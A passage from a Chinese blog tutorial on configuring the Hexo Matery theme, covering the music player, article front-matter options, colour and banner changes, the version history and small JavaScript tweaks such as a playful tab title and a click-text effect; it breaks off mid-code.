class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">if</span> <span class="token attr-name">(theme.socialLink.github)</span> <span class="token attr-name">{</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>%</span> <span class="token attr-name">}</span> <span class="token attr-name">%</span><span class="token punctuation">></span></span></code></pre><p>其中，社交图标（如：<code>fa-github</code>）你可以在 <a href="https://fontawesome.com/icons" target="_blank" rel="noopener">Font Awesome</a> 中搜索找到。以下是常用社交图标的标识，供你参考：</p><ul><li>Facebook: <code>fab fa-facebook</code></li><li>Twitter: <code>fab fa-twitter</code></li><li>Google-plus: <code>fab fa-google-plus</code></li><li>Linkedin: <code>fab fa-linkedin</code></li><li>Tumblr: <code>fab fa-tumblr</code></li><li>Medium: <code>fab fa-medium</code></li><li>Slack: <code>fab fa-slack</code></li><li>Sina Weibo: <code>fab fa-weibo</code></li><li>Wechat: <code>fab fa-weixin</code></li><li>QQ: <code>fab fa-qq</code></li><li>Zhihu: <code>fab fa-zhihu</code></li></ul><blockquote><p><strong>注意</strong>: 本主题中使用的 <code>Font Awesome</code> 版本为 <code>5.11.0</code>。</p></blockquote><h3 id="2-18-修改打赏的二维码图片"><a href="#2-18-修改打赏的二维码图片" class="headerlink" title="2.18 修改打赏的二维码图片"></a>2.18 修改打赏的二维码图片</h3><p>在主题文件的 <code>source/medias/reward</code> 文件中，你可以替换成你的的微信和支付宝的打赏二维码图片。</p><h3 id="2-19-配置音乐播放器（可选的）"><a href="#2-19-配置音乐播放器（可选的）" class="headerlink" title="2.19 配置音乐播放器（可选的）"></a>2.19 配置音乐播放器（可选的）</h3><p>要支持音乐播放，就必须开启音乐的播放配置和音乐数据的文件。</p><p>首先，在你的博客 <code>source</code> 目录下的 <code>_data</code> 目录（没有的话就新建一个）中新建 <code>musics.json</code> 文件，文件内容如下所示：</p><pre class=" language-json"><code class="language-json"><span class="token punctuation">[</span><span class="token punctuation">{</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"五月雨变奏电音"</span><span class="token punctuation">,</span>    <span class="token property">"artist"</span><span class="token operator">:</span> <span class="token string">"AnimeVibe"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://xxx.com/music1.mp3"</span><span class="token punctuation">,</span>    <span class="token property">"cover"</span><span class="token operator">:</span> <span class="token string">"http://xxx.com/music-cover1.png"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Take me hand"</span><span class="token punctuation">,</span>    <span class="token property">"artist"</span><span class="token operator">:</span> <span class="token string">"DAISHI DANCE,Cecile Corbel"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"/medias/music/music2.mp3"</span><span class="token punctuation">,</span>    <span class="token property">"cover"</span><span class="token operator">:</span> <span class="token string">"/medias/music/cover2.png"</span><span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token punctuation">{</span>    <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Shape of You"</span><span class="token punctuation">,</span>    <span class="token property">"artist"</span><span class="token operator">:</span> <span class="token string">"J.Fla"</span><span class="token punctuation">,</span>    <span class="token property">"url"</span><span class="token operator">:</span> <span class="token string">"http://xxx.com/music3.mp3"</span><span class="token punctuation">,</span>    <span class="token property">"cover"</span><span class="token operator">:</span> <span class="token string">"http://xxx.com/music-cover3.png"</span><span class="token punctuation">}</span><span class="token punctuation">]</span></code></pre><blockquote><p><strong>注</strong>：以上 JSON 中的属性：<code>name</code>、<code>artist</code>、<code>url</code>、<code>cover</code> 分别表示音乐的名称、作者、音乐文件地址、音乐封面。</p></blockquote><p>然后，在主题的 <code>_config.yml</code> 配置文件中激活配置即可：</p><pre class=" language-yaml"><code class="language-yaml"><span class="token comment" spellcheck="true"># 是否在首页显示音乐.</span><span class="token key atrule">music</span><span class="token punctuation">:</span>  <span class="token key atrule">enable</span><span class="token punctuation">:</span> <span class="token boolean important">true</span>  <span class="token key atrule">showTitle</span><span class="token punctuation">:</span> <span class="token boolean important">false</span>  <span class="token key atrule">title</span><span class="token punctuation">:</span> 听听音乐  <span class="token key atrule">fixed</span><span class="token punctuation">:</span> <span class="token boolean important">false </span><span class="token comment" spellcheck="true"># 是否开启吸底模式</span>  <span class="token key atrule">autoplay</span><span class="token punctuation">:</span> <span class="token boolean important">false </span><span class="token comment" spellcheck="true"># 是否自动播放</span>  <span class="token key atrule">theme</span><span class="token punctuation">:</span> '<span class="token comment" spellcheck="true">#42b983'</span>  <span class="token key atrule">loop</span><span class="token punctuation">:</span> <span class="token string">'all'</span> <span class="token comment" spellcheck="true"># 音频循环播放, 可选值: 'all', 'one', 'none'</span>  <span class="token key atrule">order</span><span class="token punctuation">:</span> <span class="token string">'list'</span> <span class="token comment" spellcheck="true"># 音频循环顺序, 可选值: 'list', 'random'</span>  <span class="token key atrule">preload</span><span class="token punctuation">:</span> <span class="token string">'auto'</span> <span class="token comment" spellcheck="true"># 预加载，可选值: 'none', 'metadata', 'auto'</span>  <span class="token key atrule">volume</span><span class="token punctuation">:</span> <span class="token number">0.7 </span><span class="token comment" spellcheck="true"># 默认音量，请注意播放器会记忆用户设置，用户手动设置音量后默认音量即失效</span>  <span class="token key atrule">listFolded</span><span class="token punctuation">:</span> <span class="token boolean important">false </span><span class="token comment" spellcheck="true"># 列表默认折叠</span>  <span class="token key atrule">listMaxHeight</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true"># 列表最大高度</span></code></pre><h2 id="3-文章-Front-matter-介绍"><a href="#3-文章-Front-matter-介绍" class="headerlink" title="3. 文章 Front-matter 介绍"></a>3. 文章 Front-matter 介绍</h2><h3 id="Front-matter-选项详解"><a href="#Front-matter-选项详解" class="headerlink" title="Front-matter 选项详解"></a>Front-matter 选项详解</h3><p><code>Front-matter</code> 选项中的所有内容均为<strong>非必填</strong>的。但我仍然建议至少填写 <code>title</code> 和 <code>date</code> 的值。</p><table><thead><tr><th>配置选项</th><th>默认值</th><th>描述</th></tr></thead><tbody><tr><td>title</td><td><code>Markdown</code> 的文件标题</td><td>文章标题，强烈建议填写此选项</td></tr><tr><td>date</td><td>文件创建时的日期时间</td><td>发布时间，强烈建议填写此选项，且最好保证全局唯一</td></tr><tr><td>author</td><td>根 <code>_config.yml</code> 中的 <code>author</code></td><td>文章作者</td></tr><tr><td>img</td><td><code>featureImages</code> 中的某个值</td><td>文章特征图，推荐使用图床(腾讯云、七牛云、又拍云等)来做图片的路径.如: <code>http://xxx.com/xxx.jpg</code></td></tr><tr><td>top</td><td><code>true</code></td><td>推荐文章（文章是否置顶），如果 <code>top</code> 值为 <code>true</code>，则会作为首页推荐文章</td></tr><tr><td>cover</td><td><code>false</code></td><td><code>v1.0.2</code>版本新增，表示该文章是否需要加入到首页轮播封面中</td></tr><tr><td>coverImg</td><td>无</td><td><code>v1.0.2</code>版本新增，表示该文章在首页轮播封面需要显示的图片路径，如果没有，则默认使用文章的特色图片</td></tr><tr><td>password</td><td>无</td><td>文章阅读密码，如果要对文章设置阅读验证密码的话，就可以设置 <code>password</code> 的值，该值必须是用 <code>SHA256</code> 加密后的密码，防止被他人识破。前提是在主题的 <code>config.yml</code> 中激活了 <code>verifyPassword</code> 选项</td></tr><tr><td>toc</td><td><code>true</code></td><td>是否开启 TOC，可以针对某篇文章单独关闭 TOC 的功能。前提是在主题的 <code>config.yml</code> 中激活了 <code>toc</code> 选项</td></tr><tr><td>mathjax</td><td><code>false</code></td><td>是否开启数学公式支持 ，本文章是否开启 <code>mathjax</code>，且需要在主题的 <code>_config.yml</code> 文件中也需要开启才行</td></tr><tr><td>summary</td><td>无</td><td>文章摘要，自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要</td></tr><tr><td>categories</td><td>无</td><td>文章分类，本主题的分类表示宏观上大的分类，只建议一篇文章一个分类</td></tr><tr><td>tags</td><td>无</td><td>文章标签，一篇文章可以多个标签</td></tr><tr><td>reprintPolicy</td><td>cc_by</td><td>文章转载规则， 可以是 cc_by, cc_by_nd, cc_by_sa, cc_by_nc, cc_by_nc_nd, cc_by_nc_sa, cc0, noreprint 或 pay 中的一个</td></tr></tbody></table><blockquote><p><strong>注意</strong>:</p><ol><li>如果 <code>img</code> 属性不填写的话，文章特色图会根据文章标题的 <code>hashcode</code> 的值取余，然后选取主题中对应的特色图片，从而达到让所有文章都的特色图<strong>各有特色</strong>。</li><li><code>date</code> 的值尽量保证每篇文章是唯一的，因为本主题中 <code>Gitalk</code> 和 <code>Gitment</code> 识别 <code>id</code> 是通过 <code>date</code> 的值来作为唯一标识的。</li><li>如果要对文章设置阅读验证密码的功能，不仅要在 Front-matter 中设置采用了 SHA256 加密的 password 的值，还需要在主题的 <code>_config.yml</code> 中激活了配置。有些在线的 SHA256 加密的地址，可供你使用：<a href="http://tool.oschina.net/encrypt?type=2" target="_blank" rel="noopener">开源中国在线工具</a>、<a href="http://encode.chahuo.com/" target="_blank" rel="noopener">chahuo</a>、<a href="http://tool.chinaz.com/tools/hash.aspx" target="_blank" rel="noopener">站长工具</a>。</li><li>您可以在文章md文件的 front-matter 中指定 reprintPolicy 来给单个文章配置转载规则</li></ol></blockquote><p>以下为文章的 <code>Front-matter</code> 示例。</p><h3 id="最简示例"><a href="#最简示例" class="headerlink" title="最简示例"></a>最简示例</h3><pre class=" language-yml"><code class="language-yml">---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00---</code></pre><h3 id="最全示例"><a href="#最全示例" class="headerlink" title="最全示例"></a>最全示例</h3><pre class=" language-yml"><code class="language-yml">---title: typora-vue-theme主题介绍date: 2018-09-07 09:25:00author: 赵奇img: /source/images/xxx.jpgtop: truecover: truecoverImg: /images/1.jpgpassword: 8d969eef6ecad3c29a3a629280e686cf0c3f5d5a86aff3ca12020c923adc6c92toc: falsemathjax: falsesummary: 这是你自定义的文章摘要内容，如果这个属性有值，文章卡片摘要就显示这段文字，否则程序会自动截取文章的部分内容作为摘要categories: Markdowntags:  - Typora  - Markdown---</code></pre><h2 id="4-效果截图"><a href="#4-效果截图" class="headerlink" title="4. 效果截图"></a>4. 效果截图</h2><blockquote><p><strong>最新版本进行了优化更新，效果图与最初的效果图有差别，下面的图不是最新版本的。</strong></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="http://static.blinkfox.com/matery-20181202-1.png" alt="首页">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="http://static.blinkfox.com/matery-20181202-1.png" alt="首页"></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="http://static.blinkfox.com/matery-20181202-2.png" alt="首页推荐文章">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="http://static.blinkfox.com/matery-20181202-2.png" alt="首页推荐文章"></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="http://static.blinkfox.com/matery-20181202-3.png" alt="首页文章列表">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="http://static.blinkfox.com/matery-20181202-3.png" alt="首页文章列表"></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="http://static.blinkfox.com/matery-20181202-7.png" alt="关于我页面">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="http://static.blinkfox.com/matery-20181202-7.png" alt="关于我页面"></p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="http://static.blinkfox.com/matery-20181202-8.png" alt="文章详细页面">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="http://static.blinkfox.com/matery-20181202-8.png" alt="文章详细页面"></p><h2 id="5-自定制修改"><a href="#5-自定制修改" class="headerlink" title="5. 自定制修改"></a>5. 自定制修改</h2><p>在本主题的 <code>_config.yml</code> 中可以修改部分自定义信息，有以下几个部分：</p><ul><li>菜单</li><li>我的梦想</li><li>首页的音乐播放器和视频播放器配置</li><li>是否显示推荐文章名称和按钮配置</li><li><code>favicon</code> 和 <code>Logo</code></li><li>个人信息</li><li>TOC 目录</li><li>文章打赏信息</li><li>复制文章内容时追加版权信息</li><li>MathJax</li><li>文章字数统计、阅读时长</li><li>点击页面的’爱心’效果</li><li>我的项目</li><li>我的技能</li><li>我的相册</li><li><code>Gitalk</code>、<code>Gitment</code>、<code>Valine</code> 和 <code>disqus</code> 评论配置</li><li><a href="http://busuanzi.ibruce.info/" target="_blank" rel="noopener">不蒜子统计</a>和谷歌分析（<code>Google Analytics</code>）</li><li>默认特色图的集合。当文章没有设置特色图时，本主题会根据文章标题的 <code>hashcode</code> 值取余，来选择展示对应的特色图</li></ul><p><strong>我认为个人博客应该都有自己的风格和特色</strong>。如果本主题中的诸多功能和主题色彩你不满意，可以在主题中自定义修改，很多更自由的功能和细节点的修改难以在主题的 <code>_config.yml</code> 中完成，需要修改源代码才来完成。以下列出了可能对你有用的地方：</p><h3 id="5-1-修改主题颜色"><a href="#5-1-修改主题颜色" class="headerlink" title="5.1 修改主题颜色"></a>5.1 修改主题颜色</h3><p>在主题文件的 <code>/source/css/matery.css</code> 文件中，搜索 <code>.bg-color</code> 来修改背景颜色：</p><pre class=" language-css"><code class="language-css"><span class="token comment" spellcheck="true">/* 整体背景颜色，包括导航、移动端的导航、页尾、标签页等的背景颜色. */</span><span class="token selector"><span class="token class">.bg-color</span> </span><span class="token punctuation">{</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">linear-gradient</span><span class="token punctuation">(</span>to right, <span class="token hexcode">#4cbf30</span> <span class="token number">0%</span>, <span class="token hexcode">#0f9d58</span> <span class="token number">100%</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">/*如果想去掉banner图的颜色渐变效果，请将以下的css属性注释掉或者删除掉即可*/</span><span class="token atrule"><span class="token rule">@-webkit-keyframes</span> rainbow</span> <span class="token punctuation">{</span>   <span class="token comment" spellcheck="true">/* 动态切换背景颜色. */</span><span class="token punctuation">}</span><span class="token atrule"><span class="token rule">@keyframes</span> rainbow</span> <span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">/* 动态切换背景颜色. */</span><span class="token punctuation">}</span></code></pre><h3 id="5-2-修改-banner-图和文章特色图"><a href="#5-2-修改-banner-图和文章特色图" class="headerlink" title="5.2 修改 banner 图和文章特色图"></a>5.2 修改 banner 图和文章特色图</h3><p>你可以直接在 <code>/source/medias/banner</code> 文件夹中更换你喜欢的 <code>banner</code> 图片，主题代码中是每天动态切换一张，只需 <code>7</code> 张即可。如果你会 <code>JavaScript</code> 代码，可以修改成你自己喜欢切换逻辑，如：随机切换等，<code>banner</code> 切换的代码位置在 <code>/layout/_partial/bg-cover-content.ejs</code> 文件的 <code>&lt;script&gt;&lt;/script&gt;</code> 代码中：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'.bg-cover'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">css</span><span class="token punctuation">(</span><span class="token string">'background-image'</span><span class="token punctuation">,</span> <span class="token string">'url(/medias/banner/'</span> <span class="token operator">+</span> <span class="token keyword">new</span> <span class="token class-name">Date</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getDay</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'.jpg)'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>在 <code>/source/medias/featureimages</code> 文件夹中默认有 24 张特色图片，你可以再增加或者减少，并需要在 <code>_config.yml</code> 做同步修改。</p><p>如果想改为每小时或者每分钟切换banner图的话，需要将<code>getDay()</code>改为<code>getHours()</code>或者<code>getMinutes()</code>即可。</p><h2 id="6-版本记录"><a href="#6-版本记录" class="headerlink" title="6. 版本记录"></a>6. 版本记录</h2><ul><li><p>v1.2.2</p><ul><li>新增了自定义文章 <code>keywords</code> 的功能；</li><li>新增静态彩带点击切换的功能和配置；</li><li>将文章字数统计、彩带和站点运行时间等功能默认设置为 <code>false</code>；</li><li>修改了文章的 <code>description</code> 的 meta 属性优先读取文章的 <code>summary</code> 属性；</li><li>修改了文章标题的 HTML 标签，从 <code>div</code> 改成了 <code>h1</code> 标题；</li><li>修改了页脚年份显示不正确的问题；</li><li>去掉了站点运行时间中多余的 <code>setTimeout</code> 代码；</li></ul></li><li><p>v1.2.1</p><ul><li>新增了 TOC 的展开目录层级设置和滚动条功能，防止目录较多的时候目录溢出；</li><li>修改了首页的展示方式为以前的模式；</li><li>修复首页按钮没有边框的问题；</li><li>修复了音乐及吸底模式、视频、推荐文章等不激活时仍然生成首页卡片的问题；</li><li>修复 wordCount 插件未安装的问题，修改了部分配置；</li><li>修复音乐的 JSON 配置中有单引号的情况页面不显示的音乐的问题</li><li>修复标签云在Hexo4.0下链接失效的问题；</li></ul></li><li><p>v1.2.0</p><ul><li>新增了 <a href="http://www.daovoice.io/" target="_blank" rel="noopener">DaoVoice</a>、<a href="https://www.tidio.com/" target="_blank" rel="noopener">Tidio</a> 的在线聊天功能；</li><li>新增了两级菜单的功能；</li><li>新增了打字效果的副标题；</li><li>新增了网页内容预加载的功能；</li><li>新增了首页 banner 是否每日切换的配置功能；</li><li>新增了显示 ICP 备案信息的功能，默认未开启；</li><li>新增了百度分析的配置；</li><li>新增了代码块的语言显示、一键复制、显示行号等功能；</li><li>新增了首页轮播图和推荐文章可自定义配置的功能；</li><li>新增了文章页面显示更新日期；</li><li>新增了转载规则的图标；</li><li>修改了分享的布局和显示方式；</li><li>升级更新了部分依赖库的版本；</li><li>其他细节修改和优化；</li></ul></li><li><p>v1.1.0</p><ul><li>新增了 <code>emoji</code> 的支持；</li><li>新增了站点运行时间统计及配置；</li><li>新增了留言板的功能,默认未开启；</li><li>新增了 <code>Twitter</code>、<code>Facebook</code>、知乎的社交链接；</li><li>更新了 <code>Valine</code> 的版本为最新版；</li><li>其他小细节的修改；</li></ul></li><li><p>v1.0.4</p><ul><li>新增了能为每篇文章都自定义转载规则的功能；</li><li>修复上一页、下一页的自定义 <code>summary</code> 不显示的问题；</li><li>修复了友情链接显示错位的问题，改为了瀑布流的布局方式；</li><li>其他小细节 bug 的修改；</li></ul></li><li><p>v1.0.3</p><ul><li>新增了<code>TOC</code>展开、收缩的按钮和相关配置，默认显示此按钮；</li></ul></li><li><p>v1.0.2</p><ul><li>升级了 <a href="https://materializecss.com/" target="_blank" rel="noopener">Materialize</a> 框架版本为<code>1.0.0</code>，重构和修改了升级过程中的部分文件或问题；</li><li>新增了首页封面的全屏轮播特效，可以将更重要的文章设置到首页轮播中；</li><li>修复首页第一个按钮是中文的问题</li><li>修复了 iPhone 上点击搜索输入获取焦点的问题；</li><li>修复了 iPhone 上输入框获取焦点后页面放大的问题；</li><li>修复一些文章或 UI 显示问题；</li></ul></li><li><p>v1.0.1</p><ul><li>调整 <code>css</code>、<code>js</code> 的文件请求路径在主题的<code>_config.yml</code>中配置，便于你更快捷的配置自己的 CDN；</li><li>新增代码是否折行为可配置，默认为折行；</li><li>默认激活 <code>TOC</code> 功能，并新增为某篇文章关闭 <code>TOC</code> 的 <code>Front-matter</code> 配置选项；</li><li>修复文章滚动时，高亮的目录选项不准确的问题；</li><li><code>IOS</code>下移除搜索框自动获得焦点属性，防止自动获得焦点后导致视图上移；</li></ul></li><li><p>v1.0.0</p><ul><li>新增了所有基础功能；</li></ul></li></ul><h1 id="六、其他一些DIY-可选"><a href="#六、其他一些DIY-可选" class="headerlink" title="六、其他一些DIY(可选)"></a>六、其他一些DIY(可选)</h1><blockquote><p>主题DIY会涉及到js文件和css文件等的修改，个人建议新增的js文件放在<code>themes/matery/layout/layout.ejs</code>这个文件下，这样会稍微加快博客访问的速度。不想花钱​最好的方式是使用cdn.jsdeliver。以后会说到。</p></blockquote><h2 id="1-动态标题"><a href="#1-动态标题" class="headerlink" title="1. 动态标题"></a>1. 动态标题</h2><p>先放上效果图再说：</p><p><img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191201224219.png" alt="离开当前页面时">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191201224219.png" alt="离开当前页面时"> <img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191201224258.png" alt="返回当前页面时">)<img src="https://cdn.jsdelivr.net/gh/lateral404/image/image/20200207141100.gif" data-original="https://cdn.jsdelivr.net/gh/Yafine/Yafine-imgs/images/20191201224258.png" alt="返回当前页面时"></p><p>实现方法，引入js文件，在主题文件下的<code>/source/js/</code>下新建<code>FunnyTitle.js</code>，然后在添加到<code>themes/matery/layout/layout.ejs</code>或者添加到<code>themes/matery/layout/_partial/head.ejs</code>，其代码如下：</p><pre class=" language-javascript"><code class="language-javascript"> <span class="token keyword">var</span> OriginTitle <span class="token operator">=</span> document<span class="token punctuation">.</span>title<span class="token punctuation">;</span> <span class="token keyword">var</span> titleTime<span class="token punctuation">;</span> document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">'visibilitychange'</span><span class="token punctuation">,</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span>document<span class="token punctuation">.</span>hidden<span class="token punctuation">)</span> <span class="token punctuation">{</span>         <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'[rel="icon"]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">,</span> <span class="token string">"https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/favicon.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         document<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">'ヽ(●-`Д´-)ノ你要玩捉迷藏嘛'</span><span class="token punctuation">;</span>         <span class="token function">clearTimeout</span><span class="token punctuation">(</span>titleTime<span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span>     <span class="token keyword">else</span> <span class="token punctuation">{</span>         <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">'[rel="icon"]'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">attr</span><span class="token punctuation">(</span><span class="token string">'href'</span><span class="token punctuation">,</span> <span class="token string">"https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/favicon.png"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         document<span class="token punctuation">.</span>title <span class="token operator">=</span> <span class="token string">'ヾ(Ő∀Ő3)ノ好哦！'</span> <span class="token operator">+</span> OriginTitle<span class="token punctuation">;</span>         titleTime <span class="token operator">=</span> <span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>             document<span class="token punctuation">.</span>title <span class="token operator">=</span> OriginTitle<span class="token punctuation">;</span>         <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">}</span> <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>我的链接：<strong><a href="https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/js/FunnyTitle.js" target="_blank" rel="noopener">https://cdn.jsdelivr.net/gh/Yafine/cdn@2.5/source/js/FunnyTitle.js</a></strong>（理论上一直有效）</p><p>或者直接在<code>themes/matery/layout/layout.ejs</code>文件中添加如下代码：</p><pre class=" language-javascript"><code class="language-javascript">    <span class="token keyword">var</span> OriginTitile<span class="token operator">=</span>document<span class="token punctuation">.</span>title<span class="token punctuation">,</span>st<span class="token punctuation">;</span>    document<span class="token punctuation">.</span><span class="token function">addEventListener</span><span class="token punctuation">(</span><span class="token string">"visibilitychange"</span><span class="token punctuation">,</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        document<span class="token punctuation">.</span>hidden<span class="token operator">?</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>title<span class="token operator">=</span><span class="token string">"ヽ(●-`Д´-)ノ你要玩捉迷藏嘛"</span><span class="token punctuation">,</span><span class="token function">clearTimeout</span><span class="token punctuation">(</span>st<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">(</span>document<span class="token punctuation">.</span>title<span class="token operator">=</span><span class="token string">"(Ő∀Ő3)ノ好哦！"</span><span class="token punctuation">,</span>st<span class="token operator">=</span><span class="token function">setTimeout</span><span class="token punctuation">(</span><span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>document<span class="token punctuation">.</span>title<span class="token operator">=</span>OriginTitile<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token number">3e3</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">}</span><span class="token punctuation">)</span></code></pre><h2 id="2-修改导航栏颜色以及透明效果"><a href="#2-修改导航栏颜色以及透明效果" class="headerlink" title="2. 修改导航栏颜色以及透明效果"></a>2. 修改导航栏颜色以及透明效果</h2><p>打开<code>themes/matery/source/css/matery.css</code>文件，大约在250行，有一个<code>.bg-color</code>属性，修改其属性值即可，代码如下：</p><pre class=" language-css"><code class="language-css"><span class="token selector"><span class="token class">.bg-color</span> </span><span class="token punctuation">{</span>    <span class="token property">background-image</span><span class="token punctuation">:</span> <span class="token function">linear-gradient</span><span class="token punctuation">(</span>to right, <span class="token hexcode">#4cbf30</span> <span class="token number">0%</span>, <span class="token hexcode">#0f9d58</span> <span class="token number">100%</span><span class="token punctuation">)</span><span class="token punctuation">;</span> //修改成自己喜欢的颜色值    <span class="token property">opacity</span><span class="token punctuation">:</span> <span class="token number">0.8</span><span class="token punctuation">;</span>  //透明效果 值范围 <span class="token number">0</span>~<span class="token number">1</span>，看情况自己修改<span class="token punctuation">}</span></code></pre><h2 id="3-添加动态诗词"><a href="#3-添加动态诗词" class="headerlink" title="3. 添加动态诗词"></a>3. 添加动态诗词</h2><p>采用的是<a href="https://www.jinrishici.com/" target="_blank" rel="noopener">今日诗词</a>，每次返回一句诗词，根据时间、地点、天气、事件智能推荐。官网有<a href="https://www.jinrishici.com/doc/" target="_blank" rel="noopener">API文档</a>，可以去看一下，有多种安装方式，最简单的方式就是从官网获取代码，在<code>/themes/matery/layout/_partial/head.ejs</code>添加下面的一行代码：</p><p>然后再将<code>/themes/matery/layout/_partial/bg-cover-content.ejs</code>中的<code>&lt;%= config.description %&gt;</code>修改为把<code>&lt;%= config.description %&gt;</code>改为<code>&lt;%- '&lt;span id="jinrishici-sentence"&gt;正在加载今日诗词....&lt;/span&gt;' %&gt;</code>，这个使用前提是将主题配置文件的<code>subtitle</code>的值改为<code>false</code>。</p><h2 id="4-鼠标点击文字特效"><a href="#4-鼠标点击文字特效" class="headerlink" title="4. 鼠标点击文字特效"></a>4. 鼠标点击文字特效</h2><p>实现方法，引入js文件，在主题文件下的<code>/source/js/</code>下新建<code>click_show_text.js</code>，其代码如下：</p><pre class=" language-javascript"><code class="language-javascript"><span class="token keyword">var</span> a_idx <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token function">jQuery</span><span class="token punctuation">(</span>document<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">ready</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>$<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">"body"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">click</span><span class="token punctuation">(</span><span class="token keyword">function</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">var</span> a <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Array</span><span class="token punctuation">(</span><span class="token string">"富强"</span><span class="token punctuation">,</span> <span class="token string">"民主"</span><span class="token punctuation">,</span> <span class="token string">"文明"</span><span class="token punctuation">,</span> <span class="token string">"和谐"</span><span class="token punctuation">,</span> <span class="token string">"自由"</span><span class="token punctuation">,</span> <span class="token string">"平等"</span><span class="token punctuation">,</span> <span class="token string">"公正"</span><span class="token punctuation">,</span> <span class="token string">"法治"</span><span class="token punctuation">,</span> <span class="token string">"爱国"</span><span class="token punctuation">,</span> <span class="token string">"敬业"</span><span class="token punctuation">,</span> <span class="token string">"诚信"</span><span class="token punctuation">,</span> <span class="token string">"友善"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">var</span> $i <span class="token operator">=</span> <span class="token function">$</span><span class="token punctuation">(</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">text</span><span class="token punctuation">(</span>a<span class="token punctuation">[</span>a_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        a_idx <span class="token operator">=</span> <span class="token punctuation">(</span>a_idx <span class="token operator">+</span> <span 